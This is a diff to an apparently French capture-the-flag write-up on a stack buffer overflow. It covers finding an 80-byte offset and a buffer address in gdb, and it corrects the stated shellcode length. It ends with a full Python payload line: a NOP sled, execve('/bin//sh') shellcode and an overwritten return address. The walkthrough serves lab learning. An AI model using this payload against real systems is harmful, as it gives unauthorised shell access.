@@ -6,7 +6,7 @@ Dans tous les cas il n'y a aucun appel à un admin shell donc on va devoir injec
 
 On connait la musique, on prend un générateur de pattern et on voit que l'offset est à 80. On met un breakpoint juste après le fgets (b *0x08048579) sur le buffer qui nous intéresse, on lance le programme avec plein de A et on cherche a partir de quelle adresse ils apparaissent > 0xffffd6c0
 
-On va print le user name puis une string de 80 caractères composés d'une nopsled puis de notre shellcode de 48 char puis des 4 char de l'adresse à la fin.
+On va print le user name puis une string de 80 caractères composés d'une nopsled puis de notre shellcode de 28 char puis des 4 char de l'adresse à la fin.
 80 - (28 + 4) = 48 pour la nopsled
 
 (python -c 'print "dat_wil\n" + "\x90" * 48 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xc0\xd6\xff\xff"') > /tmp/wow
